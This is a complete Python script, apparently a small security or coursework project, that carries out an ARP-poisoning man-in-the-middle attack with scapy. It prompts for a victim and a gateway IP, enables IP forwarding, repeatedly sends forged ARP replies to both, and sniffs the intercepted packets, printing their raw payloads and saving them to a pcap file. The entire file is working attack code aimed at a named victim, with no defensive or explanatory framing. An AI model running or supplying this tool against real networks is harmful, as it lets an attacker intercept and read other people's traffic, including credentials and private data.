#!/usr/bin/env python3
# Authors: Matt Matero & Will Cusick
# Python Version: 3.5.2
from scapy.all import *
import sys
import os
import time
 
try:
  interface = input("[*] Enter Desired Interface: ")
  victimIP = input("[*] Enter Victim IP: ")
  gateIP = input("[*] Enter Router IP: ")
  print()
except KeyboardInterrupt:
  print("\n[*] User Requested Shutdown")
  print("[*] Exiting...")
  sys.exit(1)

def enable_ip_forwarding():
  print("[*] Enabling IP Forwarding...")
  if sys.platform.startswith('linux'):
    os.system("sudo sysctl net.ipv4.ip_forward=1")
  elif sys.platform.startswith('darwin'):
    os.system("sudo sysctl net.inet.ip.forwarding=1")
  else:
    print("Error: Unsupported platform!")
    raise NotImplementedError("unsupported platform")

def disable_ip_forwarding():
  print("[*] Disabling IP Forwarding...")
  if sys.platform.startswith('linux'):
    os.system("sudo sysctl net.ipv4.ip_forward=0")
  elif sys.platform.startswith('darwin'):
    os.system("sudo sysctl net.inet.ip.forwarding=0")
  else:
    print("Error: Unsupported platform!")
    raise NotImplementedError("unsupported platform")

enable_ip_forwarding()

def get_mac(IP):
  print('Getting MAC addr for: ' + str(IP))
  conf.verb = 0
  ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 10, iface = interface)
  
  # keep requesting until we get response
  while len(unans) > 0:
    ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = interface)
  
  for snd,rcv in ans:
    return rcv.sprintf(r"%Ether.src%")

def reARP():
  print("\n[*] Restoring Targets...")
  victimMAC = get_mac(victimIP)
  gateMAC = get_mac(gateIP)
  send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 7)
  send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateMAC), count = 7)
  disable_ip_forwarding()
  print("[*] Shutting Down...")
  sys.exit(1)
 
def trick(gate_mac, victim_mac):
  print(gate_mac)
  print(victim_mac)
  send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst = victim_mac))
  send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst = gate_mac))

def sniffer():
    pkts = sniff(iface = interface, count = 1000, prn=lambda x:x.sprintf(" Source: %IP.src% : %Ether.src%, \n %Raw.load% \n\n Reciever: %IP.dst% \n +=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+\n"))
    wrpcap("temp.pcap", pkts)
 
def mitm():
  try:
    victimMAC = get_mac(victimIP)
    print(victimMAC)
  except Exception as e:
    print(e)
    disable_ip_forwarding()
    print("[!] Couldn't Find Victim MAC Address")
    print("[!] Exiting...")
    sys.exit(1)
  
  try:
    gateMAC = get_mac(gateIP)
  except Exception as e:
    print(e)
    disable_ip_forwarding()
    print("[!] Couldn't Find Gateway MAC Address")
    print("[!] Exiting...")
    sys.exit(1)

  print("[*] Poisoning Targets...")
  while 1:
    try:
      # print('*****')
      # print(gateMAC)
      # print(victimMAC)
      # print('******')
      trick(gateMAC, victimMAC)
      time.sleep(1.5)
      sniffer()
    except KeyboardInterrupt:
      reARP()
      break

mitm()
